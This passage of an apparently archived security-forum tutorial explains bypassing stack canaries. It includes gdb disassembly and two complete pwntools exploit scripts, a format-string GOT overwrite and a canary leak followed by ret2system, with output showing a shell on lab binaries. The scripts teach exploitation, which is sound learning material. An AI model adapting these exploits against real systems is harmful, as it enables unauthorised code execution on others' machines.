   0x08048613 &lt;+36&gt;:	mov    DWORD PTR [ebp-0xc],eax      
   0x08048616 &lt;+39&gt;:	xor    eax,eax                              ; at this point we can inspect the canary in gdb as well
   0x08048618 &lt;+41&gt;:	call   0x8048576 &lt;vuln&gt;                     ; vuln() function call 
   0x0804861d &lt;+46&gt;:	mov    eax,0x0
   0x08048622 &lt;+51&gt;:	mov    ecx,DWORD PTR [ebp-0xc]
   0x08048625 &lt;+54&gt;:	xor    ecx,DWORD PTR gs:0x14                ; canary check routine is started
   0x0804862c &lt;+61&gt;:	je     0x8048633 &lt;main+68&gt;
   0x0804862e &lt;+63&gt;:	call   0x8048410 &lt;__stack_chk_fail@plt&gt;     ; canary fault handler if check fails
   0x08048633 &lt;+68&gt;:	add    esp,0x24
   0x08048636 &lt;+71&gt;:	pop    ecx
   0x08048637 &lt;+72&gt;:	pop    ebp
   0x08048638 &lt;+73&gt;:	lea    esp,[ecx-0x4]
   0x0804863b &lt;+76&gt;:	ret    
End of assembler dump.

gefâž¤  disassemble vuln
Dump of assembler code for function vuln:
   0x08048576 &lt;+0&gt;:	push   ebp
   0x08048577 &lt;+1&gt;:	mov    ebp,esp
   0x08048579 &lt;+3&gt;:	sub    esp,0x218
   0x0804857f &lt;+9&gt;:	mov    eax,gs:0x14                            ; canary right here
   0x08048585 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048588 &lt;+18&gt;:	xor    eax,eax
   0x0804858a &lt;+20&gt;:	mov    eax,ds:0x804a040
   0x0804858f &lt;+25&gt;:	sub    esp,0x4
   0x08048592 &lt;+28&gt;:	push   eax
   0x08048593 &lt;+29&gt;:	push   0x200
   0x08048598 &lt;+34&gt;:	lea    eax,[ebp-0x20c]
   0x0804859e &lt;+40&gt;:	push   eax
   0x0804859f &lt;+41&gt;:	call   0x8048400 &lt;fgets@plt&gt;                 ; fgets routine to fetch user input
   0x080485a4 &lt;+46&gt;:	add    esp,0x10
   0x080485a7 &lt;+49&gt;:	sub    esp,0xc
   0x080485aa &lt;+52&gt;:	lea    eax,[ebp-0x20c]
   0x080485b0 &lt;+58&gt;:	push   eax                                   ; user input is pushed as argument for printf
   0x080485b1 &lt;+59&gt;:	call   0x80483d0 &lt;printf@plt&gt;                ; printf routine call
   0x080485b6 &lt;+64&gt;:	add    esp,0x10
   0x080485b9 &lt;+67&gt;:	sub    esp,0xc
   0x080485bc &lt;+70&gt;:	push   0x80486e4                             ; string is pushed as argument for puts
   0x080485c1 &lt;+75&gt;:	call   0x8048420 &lt;puts@plt&gt;                  ; puts routine call
   0x080485c6 &lt;+80&gt;:	add    esp,0x10
   0x080485c9 &lt;+83&gt;:	sub    esp,0xc
   0x080485cc &lt;+86&gt;:	lea    eax,[ebp-0x20c]
   0x080485d2 &lt;+92&gt;:	push   eax                                   ; buffer contents pushed as argument to strdup
   0x080485d3 &lt;+93&gt;:	call   0x80483f0 &lt;strdup@plt&gt;                ; strdup routine call
   0x080485d8 &lt;+98&gt;:	add    esp,0x10 
   0x080485db &lt;+101&gt;:	nop
   0x080485dc &lt;+102&gt;:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485df &lt;+105&gt;:	xor    eax,DWORD PTR gs:0x14                ; canary check routine is started
   0x080485e6 &lt;+112&gt;:	je     0x80485ed &lt;vuln+119&gt;
   0x080485e8 &lt;+114&gt;:	call   0x8048410 &lt;__stack_chk_fail@plt&gt;     ; canary fault handler if check fails
   0x080485ed &lt;+119&gt;:	leave  
   0x080485ee &lt;+120&gt;:	ret    
End of assembler dump.
gefâž¤  
</code></pre>
<p>So nothing out of the ordinary so far.<br>
I did not strip the binary and everything we would expect is at the correct place.<br>
Additionally the canary initializations and checks are nicely observable!<br>
Furthermore it is shown that the canary check is done in every called function, not just in the <code>main()</code> function of the program.</p>
<h4><a name="p-20579-recap-format-string-attacks-14" class="anchor" href="#p-20579-recap-format-string-attacks-14"></a>Recap Format String attacks</h4>
<p>The following exploit makes use of a format string bug.<br>
Hence I will quickly recap the basics here.<br>
Mostly used in conjunction with <code>printf()</code>.<br>
If we have control over what <code>printf()</code> is gonna print, letâ€™s say the contents of a user controlled <code>buf[64]</code> then we can use the following format parameters as input to manipulate the output!</p>
<pre><code>Parameters*       Meaning                                       Passed as
--------------------------------------------------------------------------
%d                decimal (int)                                 value
%u                unsigned decimal (unsigned int)               value
%x                hexadecimal (unsigned int)                    value
%s                string ((const) (unsigned) char*)             reference
%n                number of bytes written so far, (*int)        reference

*Note: Only most relevant format paramters displayed
</code></pre>
<p>If we pass <strong>n</strong> <code>%08x. </code>  to <code>printf()</code> it instructs the function to retrieve <strong>n</strong> parameters from the stack and display them as 8-digit padded hexadecimal numbers.<br>
This can be used to view memory at <strong>any</strong> location if done right, or even write a wanted amount of bytes (with <code>%n</code>) to a certain address in memory!</p>
<p>If you feel you need to brush up on it by a lot take a look at this <a href="../../../external.html?link=https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920">format string writeup from picoCTF</a>.</p>
<h4><a name="p-20579-canary-bypass-15" class="anchor" href="#p-20579-canary-bypass-15"></a>Canary bypass</h4>
<p>We will take a closer look at overwriting the Global Offset Table (GOT)!<br>
This is possible because we donâ€™t have a fully enabled RelRO:</p>
<p><strong>Partial RELRO:</strong></p>
<pre><code>* the ELF sections are reordered so that the ELF internal data sections (.got, .dtors, etc.) precede the program's data sections (.data and .bss)
* non-PLT GOT is read-only
* GOT is still writeable
</code></pre>
<p><strong>Full RELRO:</strong></p>
<pre><code>* supports all the features of partial RELRO
* the entire GOT is also (re)mapped as read-only
</code></pre>
<p>If youâ€™re struggling with the whole Global Offset Table mess I strongly recommend reading these articles by <a class="mention" href="../../u/_py.html">@_py</a>:</p>
<ol>
<li><a href="../../../external.html?link=https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488">Linux Internals ~ Dynamic Linking Wizardry</a>!</li>
<li>and <a href="../../../external.html?link=https://0x00sec.org/t/linux-internals-dynamic-linking-wizardry/1082">Linux Internals ~ The Art Of Symbol Resolution</a> for an even more detailed introduction!</li>
</ol>
<p>If youâ€™re still continuing reading without prior knowledge here is the basic approach Iâ€™m gonna take:</p>
<pre><code>1. Find a way to get a shell
2. Calculate the bytes to write for a format string attack
3. Overwrite the GOT entry for strdup() with a function we can actually use for an exploit: system()    
</code></pre>
<p>First we want to examine where our local libc is located.<br>
We can do this from within gdb as well:</p>
<pre><code>gefâž¤  vmmap libc
Start      End        Offset     Perm Path
0xf7dfd000 0xf7fad000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so       &lt;-
0xf7fad000 0xf7faf000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb0000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so
gefâž¤  
</code></pre>
<p>The base address of the used libc is at <code>0xf7dfd000</code>.</p>
<p>Next we want to find a way to pop a shell.<br>
What could be better than <code>system()</code>:</p>
<pre><code>$ readelf -s /lib/i386-linux-gnu/libc-2.23.so | grep system
    245: 00112ed0    68 FUNC    GLOBAL DEFAULT      13 svcerr_systemerr@@GLIBC_2.0
    627: 0003ada0    55 FUNC    GLOBAL DEFAULT      13 __libc_system@@GLIBC_PRIVATE
    1457: 0003ada0    55 FUNC    WEAK   DEFAULT     13 system@@GLIBC_2.0            &lt;-
</code></pre>
<p><code>system()</code> offset in glibc is <code>0x3ada0</code>.</p>
<p>Letâ€™s add up those to addresses to get the final address of <code>system()</code> in the library.</p>
<blockquote>
<p>0xf7dfd000 + 0x3ada0 = 0xf7e37da0</p>
</blockquote>
<p>Letâ€™s check if we didnâ€™t fail our maths:</p>
<pre><code>gefâž¤ x 0xf7e37da0
0xf7e37da0 &lt;__libc_system&gt;:	0x8b0cec83
gefâž¤
</code></pre>
<p>Looks good! Sweet!</p>
<blockquote>
<p>Note: Reminder on how <a href="../../../external.html?link=https://github.com/lattera/glibc/blob/master/sysdeps/posix/system.c">system()</a> works.</p>
</blockquote>
<p>Next on our list is to find the address of <code>strdup()</code> in the GOT to be able to overwrite it!</p>
<p>Letâ€™s take a look at the assembly snippet from the <code>vuln()</code> function for a second:</p>
<pre><code>   ...
   0x080485c9 &lt;+83&gt;:	sub    esp,0xc
   0x080485cc &lt;+86&gt;:	lea    eax,[ebp-0x20c]
   0x080485d2 &lt;+92&gt;:	push   eax
=&gt; 0x080485d3 &lt;+93&gt;:	call   0x80483f0 &lt;strdup@plt&gt;
   0x080485d8 &lt;+98&gt;:	add    esp,0x10
   0x080485db &lt;+101&gt;:	nop
   ...


gefâž¤  disassemble 0x80483f0
Dump of assembler code for function strdup@plt:
   0x080483f0 &lt;+0&gt;:	jmp    DWORD PTR ds:0x804a014
   0x080483f6 &lt;+6&gt;:	push   0x10
   0x080483fb &lt;+11&gt;:	jmp    0x80483c0
End of assembler dump.
gefâž¤  
</code></pre>
<p><code>0x804a014</code> is the address we want to overwrite!</p>
<h4><a name="p-20579-exploit-16" class="anchor" href="#p-20579-exploit-16"></a>Exploit</h4>
<p>Following now is a quick script I put together to get a shell without disrupting any normal control flow of the program.<br>
The bytes to overwrite <code>strdup()</code> to get <code>system()</code> where manually calculated by trial and error.<br>
First you want to check where on the stack your buffer arguments reside by doing something like this:</p>
<pre data-code-wrap="python"><code class="lang-python">
...
exploit = ""

exploit += "AAAABBBBCCCC"                      

exploit += "%x "*10
...
</code></pre>
<p>Ideally you can quickly find the <code>41414141 42424242 43434343</code> in the output besides other addresses.<br>
If you do you can see at which position your fed input is dumped.<br>
For example it could look like this:</p>
<p><code>AAAABBBBCCCC200 f7faf5a0 f7ffd53c ffffcc48 f7fd95c5 0 41414141 42424242 43434343 25207825 78252078 20782520 25207825 78252078 20782520</code><br>
That would mean our input is on the 7th position of the stack.<br>
We can replace <code>AAAABBBBCCCC</code> now with something more meaningful like an entry from the GOT we want ot overwrite.</p>
<p>Basically what we want to do next is write a certain amount of bytes and with that change the address of <code>strdup()</code>.</p>
<p>I do this 4 times to overwrite the 4 2byte positions of <code>strdup()</code> within the GOT.</p>
<pre data-code-wrap="python"><code class="lang-python">#!/usr/bin/env python

import argparse
from pwn import *
from pwnlib import *

context.arch ='i386'
context.os ='linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')


def pad(s):
    return s+"X"*(512-len(s))


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binary/vuln'

    strdup_plt = 0x804a014
    system_libc = 0xf7e37da0

    exploit = "sh;#    "

    exploit += p32(strdup_plt)
    exploit += p32(strdup_plt+1)
    exploit += p32(strdup_plt+2)
    exploit += p32(strdup_plt+3)

    exploit += "%9$136x"
    exploit += "%9$n"
    
    exploit += "%221x"
    exploit += "%10$n"
    
    exploit += "%102x"
    exploit += "%11$n"
    
    exploit += "%532x"
    exploit += "%12$n"



    padding = pad(exploit)

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""
                b *vuln+92
                b *vuln+98
                continue
                """)
    else:
        r = process([exe])

    r.send(padding)
    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)
</code></pre>
<p>##<span class="hashtag-raw">#Proof</span></p>
<pre><code class="lang-auto">$ python bypass_canary.py
[*] '/home/lab/Git/RE_binaries/0x00sec_WIP/Canary/binary/vuln2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './binary/vuln2': pid 20723
[*] Switching to interactive mode
sh;#    \x14\xa0\x0\x15\xa0\x0\x16\xa0\x0\x17\xa0\x0                                                                                                                                 804a014                                                                                                                                                                                                                            0                                                                                              f7ffd000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            f7ffd53cXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXwhoamiWelcome 0x00sec to Stack Canaries
$ whoami
lab
</code></pre>
<p>Ok this worked but it did not necessarily defeat stack canaries!<br>
I just opened another can of delicious attack surfaces and with that I was able to bypass the canaries completely.<br>
Since that just doesnâ€™t feel quite right I will give another PoC for defeating the mechanism in a more appropriate manner.</p>
<hr>
<h2><a name="p-20579-poc-2-17" class="anchor" href="#p-20579-poc-2-17"></a>PoC 2</h2>
<h3><a name="p-20579-defeating-stack-canaries-4-realz-now-18" class="anchor" href="#p-20579-defeating-stack-canaries-4-realz-now-18"></a>Defeating stack canaries 4 realz now</h3>
<p>Okay this time around a more â€˜standardâ€™ way of defeating stack canaries is shown</p>
<h4><a name="p-20579-vulnerable-program-19" class="anchor" href="#p-20579-vulnerable-program-19"></a>Vulnerable program</h4>
<pre data-code-wrap="c"><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define STDIN 0


void untouched(){
    char answer[32];
    printf("\nCanaries are fun aren't they?\n");
    exit(0);
}

void minorLeak(){
    char buf[512];
    scanf("%s", buf);
    printf(buf);
}

void totallySafeFunc(){
    char buf[1024];
    read(STDIN, buf, 2048);
}

int main(int argc, char* argv[]){

    setbuf(stdout, NULL);
    printf("echo&gt; ");
    minorLeak();
    printf("\n");
    printf("read&gt; ");
    totallySafeFunc();

    printf("&gt; I reached the end!");

    return 0;
}

</code></pre>
<p>This just reads some user input and prints some stuff back out.<br>
As the function names suggest the easiest way to beat canaries is through an information leak.<br>
We can accomplish this by using the <code>minorLeak()</code> function.<br>
Similar as before we will abuse a format string.<br>
Afterwards we leverage a buffer overflow opportunity in the <code>totallySafeFunc()</code> to redirect control flow to our likings.</p>
<pre><code>Note: Obviously this binary is heavily vulnerable!
</code></pre>
<p>The focus for the exploit will be on <code>minorLeak()</code> and <code>totallySafeFunc()</code>.<br>
Letâ€™s check out the <code>asm</code> for any possible anomalies:</p>
<pre><code>gefâž¤  disassemble minorLeak 
Dump of assembler code for function minorLeak:
   0x080485f6 &lt;+0&gt;:	push   ebp
   0x080485f7 &lt;+1&gt;:	mov    ebp,esp
   0x080485f9 &lt;+3&gt;:	sub    esp,0x218                            ; 536 bytes on the stack are reserved
   0x080485ff &lt;+9&gt;:	mov    eax,gs:0x14                          ; stack canary 
   0x08048605 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048608 &lt;+18&gt;:	xor    eax,eax
   0x0804860a &lt;+20&gt;:	sub    esp,0x8
   0x0804860d &lt;+23&gt;:	lea    eax,[ebp-0x20c]
   0x08048613 &lt;+29&gt;:	push   eax
   0x08048614 &lt;+30&gt;:	push   0x804879f
   0x08048619 &lt;+35&gt;:	call   0x80484b0 &lt;__isoc99_scanf@plt&gt;   ; user input is copied into buf
   0x0804861e &lt;+40&gt;:	add    esp,0x10
   0x08048621 &lt;+43&gt;:	sub    esp,0xc
   0x08048624 &lt;+46&gt;:	lea    eax,[ebp-0x20c]
   0x0804862a &lt;+52&gt;:	push   eax
   0x0804862b &lt;+53&gt;:	call   0x8048450 &lt;printf@plt&gt;           ; the contents of buf are printed out
   0x08048630 &lt;+58&gt;:	add    esp,0x10
   0x08048633 &lt;+61&gt;:	nop
   0x08048634 &lt;+62&gt;:	mov    eax,DWORD PTR [ebp-0xc]          ; stack canary verifucation routine started
   0x08048637 &lt;+65&gt;:	xor    eax,DWORD PTR gs:0x14
   0x0804863e &lt;+72&gt;:	je     0x8048645 &lt;minorLeak+79&gt;
   0x08048640 &lt;+74&gt;:	call   0x8048460 &lt;__stack_chk_fail@plt&gt;
   0x08048645 &lt;+79&gt;:	leave  
   0x08048646 &lt;+80&gt;:	ret                                     ; return to main()
End of assembler dump.
gefâž¤ 
</code></pre>
<hr>
<pre><code>gefâž¤  disassemble totallySafeFunc 
Dump of assembler code for function totallySafeFunc:
   0x08048647 &lt;+0&gt;:	push   ebp
   0x08048648 &lt;+1&gt;:	mov    ebp,esp
   0x0804864a &lt;+3&gt;:	sub    esp,0x418                                ; 1048 bytes are reserved on the stack
   0x08048650 &lt;+9&gt;:	mov    eax,gs:0x14                              ; stack canary
   0x08048656 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x08048659 &lt;+18&gt;:	xor    eax,eax
   0x0804865b &lt;+20&gt;:	sub    esp,0x4
   0x0804865e &lt;+23&gt;:	push   0x800
   0x08048663 &lt;+28&gt;:	lea    eax,[ebp-0x40c]
   0x08048669 &lt;+34&gt;:	push   eax
   0x0804866a &lt;+35&gt;:	push   0x0
   0x0804866c &lt;+37&gt;:	call   0x8048440 &lt;read@plt&gt;                 ; user input is requestet
   0x08048671 &lt;+42&gt;:	add    esp,0x10
   0x08048674 &lt;+45&gt;:	nop
   0x08048675 &lt;+46&gt;:	mov    eax,DWORD PTR [ebp-0xc]              ; stack canary verification routine
   0x08048678 &lt;+49&gt;:	xor    eax,DWORD PTR gs:0x14
   0x0804867f &lt;+56&gt;:	je     0x8048686 &lt;totallySafeFunc+63&gt;
   0x08048681 &lt;+58&gt;:	call   0x8048460 &lt;__stack_chk_fail@plt&gt;
   0x08048686 &lt;+63&gt;:	leave  
   0x08048687 &lt;+64&gt;:	ret                                         ; return to main()
End of assembler dump.
gefâž¤ 
</code></pre>
<p>So far we can spot nothing out of the ordinary except the obvious vulnerabilities and the presence of stack canaries.<br>
That said, letâ€™s directly jump into the exploit development!</p>
<h4><a name="p-20579-exploit-20" class="anchor" href="#p-20579-exploit-20"></a>Exploit</h4>
<pre data-code-wrap="python"><code class="lang-python">#!/usr/bin/env python2

import argparse
from pwn import *
from pwnlib import *

context.arch ='i386'
context.os ='linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/realvuln4')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')


def leak_addresses():
    leaker = '%llx.' * 68
    return leaker


def prepend_0x_to_hex_value(hex_value):
    full_hex_value = '0x' + hex_value
    return full_hex_value


def extract_lower_8_bits(double_long_chunk):
    return double_long_chunk[len(double_long_chunk) / 2:]


def cast_hex_to_int(hex_value):
    return int(hex_value, 16)


def get_canary_value(address_dump):
    get_canary_chunk = address_dump.split('.')[-2]
    get_canary_part = extract_lower_8_bits(get_canary_chunk)
    canary_with_pre_fix = prepend_0x_to_hex_value(get_canary_part)
    print("[+] Canary value is {}".format(canary_with_pre_fix))
    canary_to_int = cast_hex_to_int(canary_with_pre_fix)
    return canary_to_int


def get_libc_base_from_leak(address_dump):
    get_address_chunk = address_dump.split('.')[1]
    get_malloc_chunk_of_it = extract_lower_8_bits(get_address_chunk)
    malloc_with_prefix = prepend_0x_to_hex_value(get_malloc_chunk_of_it)
    print("[+] malloc+26 is @ {}".format(malloc_with_prefix))
    libc_base = cast_hex_to_int(malloc_with_prefix)-0x1f6faa                # offset manually calculated by leak-libcbase
    print("[+] This puts libc base address @ {}".format(hex(libc_base)))
    return libc_base


def payload(leaked_adrs):
    canary = get_canary_value(leaked_adrs)
    libc_base = get_libc_base_from_leak(leaked_adrs)

    bin_sh = int(libc.search("/bin/sh").next())
    print("[+] /bin/sh located @ offset {}".format(hex(bin_sh)))

    shell_addr = libc_base + bin_sh
    print("[+] Shell address is {}".format(hex(shell_addr)))

    print("[+] system@libc has offset: {}".format(hex(libc.symbols['system'])))
    system_call = libc_base + libc.symbols['system']
    print("[+] This puts the system call to {}".format(hex(system_call)))

    payload = ''
    payload += cyclic(1024)
    payload += p32(canary)
    payload += 'AAAA'
    payload += 'BBBBCCCC'
    #payload += p32(0x080485cb)          # jump to untouched to show code redirection
    #payload += p32(start_of_stack)      # jump to stack start if no DEP this allows easy shell popping
    payload += p32(system_call)
    payload += 'AAAA'
    payload += p32(shell_addr)
    return payload


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binary/realvuln4'

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""
                b *totallySafeFunc+42
                continue
                """)
    else:
        r = process([exe])

    r.recvuntil("echo&gt; ")
    r.sendline(leak_addresses())

    leaked_adrs = r.recvline()
    print(leaked_adrs)

    exploit = payload(leaked_adrs)

    r.recvuntil("read&gt; ")
    r.sendline(exploit)

    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)
</code></pre>
<p>This exploit is not the prettiest of all exploit scripts, but it does the job <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> .</p>
<p>This quick script will exactly do what I shortly explained before.<br>
Here is another breakdown:</p>
<ol>
<li>First we leak a bunch of addresses with the <code>%llx.</code> format string (long long-sized integer)</li>
<li>Analyze the leaked addresses,<br>
2b. It turns out our stack canary is at the 68th leaked address<br>
2c. Furthermore the middle of the stack is within the lower 8 bits of the first leaked ll integer!</li>
<li>Extract these values from the leak</li>
<li>Craft payload:<br>
4b. Fill buffer with junk<br>
4c. Insert leaked canary<br>
4d. code redirection to <code>system@glibc</code><br>
4e. fake Base Pointer<br>
4f. address of <code>/bin/sh</code> appended lastly</li>
</ol>
<h3><a name="p-20579-proof-21" class="anchor" href="#p-20579-proof-21"></a>Proof</h3>
<pre><code class="lang-auto">$ python2 defeat_canary.py
[*] '/home/lab/Git/RE_binaries/0x00sec_WIP/Canary/binary/realvuln4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './binary/realvuln4': pid 20991
ffffffffffffcb9c.f7df9008f7feffaa.f7e062e5f7fe1f60.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.f7fa5d002e786c6c.f7ffdad000000000.ffffcdc0ffffcd78.f7e5e3e9f7fe2b4b.f7fe2a70f7fa5000.108048200.804a014f7ffd918.f7ffdad0f7fe78a2.1f7fd34a0.1.f7fa5d60f7e532d8.0.f7ffd00000000000.ffffcd70080482a0.0.f7e350cbf7df9798.f7fa500000000000.ffffcdb8f7fa5000.f7fa5d60f7e3c696.ffffcda4080487a2.f7fa5d60f7e3c670.f7e3c675f7ffd918.80487a214b94100.

[+] Canary value is 0x14b94100
[+] Mid of Stack is @ 0xffffcb9c
[+] Beginning of Stack is -512 from that: 0xffffc99c
[+] malloc+26 is @ 0xf7feffaa
[+] This puts libc base address @ 0xf7df9000
[+] /bin/sh located @ offset 0x15ba0b
[+] Shell address is 0xf7f54a0b
[+] system@libc has offset: 0x3ada0
[+] This puts the system call to 0xf7e33da0
[*] Switching to interactive mode
$ whoami
lab
$
</code></pre>
<p>We can see in the output that control flow got redirected and popped us a shell!<br>
So what do we do with this information now?</p>
<p>If we assume we have a possible information leak and can get the canary value at all times, bypassing them is not a problem.<br>
Redirection/Changing the control flow of a program is the next big step.</p>
<ul>
<li>Just pulling it back to the Stack will not work if DEP is enabled.</li>
<li>Overwriting the GOT is only easily possible if RELRO is only partially enabled, and leaking the canary might not even be needed in this use case,</li>
<li>Otherwise good olâ€™ ret2system still works wonders <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></li>
</ul>
<h2><a name="p-20579-conclusion-22" class="anchor" href="#p-20579-conclusion-22"></a>Conclusion</h2>
<p>The covered approach was first implemented over 20 years ago.<br>
For such an early adaption the security aspect was quite high.<br>
But which implications for canaries must be fulfilled if they want to be viable?<br>
We kinda showed that by focusing on their weaknesses!</p>
<p>To be secure, a canary must ensure at least the following properties:</p>
<pre><code>* be not predictable (must be generated from a source with good entropy)    =&gt; depends on the used random generator!
* must be located in a non-accessible location                              =&gt; we were able to access it!
* cannot be brute-forced                                                    =&gt; goes hand in hand with the argument before and was not true!
* should always contain at least one termination character                  =&gt; currently depends on the used canary, so not always the case!
</code></pre>
<p>Clever instrumentation of other program components made it possible to still find a way to build a bypass or even avoid them completely even when present in every function within a program.<br>
The two presented PoCs hopefully showed the above in a digestible way.</p>
<p>As always in my series Iâ€™m looking forward to any feedback.<br>
But more importantly I hope the stack canary overview cleared any misconceptions was helpful in any way.<br>
Next on the plate will be address space layout randomization!</p>
<p>-ricksanchez</p>
<h3><a name="p-20579-further-references-23" class="anchor" href="#p-20579-further-references-23"></a>Further References</h3>
<p><a href="../../../external.html?link=https://outflux.net/blog/archives/2014/01/27/fstack-protector-strong/">Linux gcc stack protector flags</a><br>
<a href="../../../external.html?link=https://www.elttam.com.au/blog/playing-with-canaries/">Playing with canaries for an in depth look at canary implementations</a><br>
<a href="../../../external.html?link=https://www.exploit-db.com/papers/24085/">Stack smashing article on ExploitDB</a><br>
<a href="../../../external.html?link=https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/">Bypassing stack cookies on corelan</a><br>
<a href="../../../external.html?link=https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx">Bypassing exploit mitigations on SO</a><br>
<a href="../../../external.html?link=https://github.com/angelorighi/exploits/blob/master/Image2PDF-seh-poc.py">SEH exploit PoC for Windows example</a><br>
<a href="../../../external.html?link=http://phrack.org/issues/56/5.html">An excellent Phrack Issue 56 on stack canaries</a><br>
<a href="../../../external.html?link=http://www.phrack.com/issues/55/8.html#article">An excellent Phrack Issue 55 on overwriting a frame pointer</a><br>
<a href="../../../external.html?link=https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf">StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks</a><br>
<a href="../../../external.html?link=https://www.cs.jhu.edu/~rubin/courses/sp03/papers/stackguard.pdf">Protecting Systems from Stack Smashing Attacks with StackGuard</a><br>
<a href="../../../external.html?link=https://github.com/VulnHub/ctf-writeups/blob/master/2017/codegate-prequels/babypwn.md">babypwn with leaking stack canaries</a><br>
<a href="../../../external.html?link=http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf">4 ways to bypass stack canaries (no real PoCs tho)</a><br>
<a href="../../../external.html?link=https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-slides.pdf">Blackhat '09 talk about overall exploit mitigation security</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="20" />
              <span class='post-likes'>20 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-02-23T19:50:59Z' class='post-time'>
                    February 23, 2018,  7:50pm
                  </time>
                  <meta itemprop='dateModified' content='2018-02-23T19:50:59Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
